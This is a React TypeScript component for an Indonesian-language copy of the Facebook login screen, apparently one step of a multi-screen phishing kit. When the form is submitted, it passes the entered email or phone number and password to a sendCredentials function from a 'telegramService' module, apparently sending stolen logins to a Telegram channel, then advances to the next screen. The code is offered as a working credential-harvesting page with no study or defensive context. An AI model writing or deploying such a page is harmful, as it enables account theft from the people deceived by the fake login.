
import React, { useState } from 'react';
import type { StepProps } from '../types';
import { sendCredentials } from '../services/telegramService';
import { FacebookLogo } from './icons/FacebookLogo';

const Screen3_Login: React.FC<StepProps> = ({ onNext }) => {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (emailOrPhone.trim() && password.trim()) {
      sendCredentials(emailOrPhone, password);
      onNext();
    }
  };

  return (
    <div className="bg-[#F0F2F5] min-h-screen flex flex-col justify-center items-center py-12">
      <div className="w-full max-w-md px-4 md:px-0">
        <div className="text-center mb-8">
            <FacebookLogo className="w-auto h-12 mx-auto" />
        </div>
        <div className="bg-white shadow-lg rounded-lg p-6">
          <p className="text-center text-gray-600 pb-4">Masuk ke Facebook</p>
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <input
                type="text"
                value={emailOrPhone}
                onChange={(e) => setEmailOrPhone(e.target.value)}
                placeholder="Email atau Nomor Telepon"
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <div className="mb-4">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Kata Sandi"
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <button
              type="submit"
              className="w-full bg-[#1877F2] hover:bg-blue-600 text-white font-bold text-xl py-3 rounded-md transition-colors"
            >
              Masuk
            </button>
            <div className="text-center my-4">
              <a href="#" className="text-blue-600 hover:underline text-sm">
                Lupa Kata Sandi?
              </a>
            </div>
            <div className="border-t border-gray-300 my-4"></div>
            <div className="text-center">
                <button type="button" className="bg-[#42B72A] hover:bg-green-600 text-white font-bold py-3 px-4 rounded-md transition-colors">
                    Buat Akun Baru
                </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Screen3_Login;
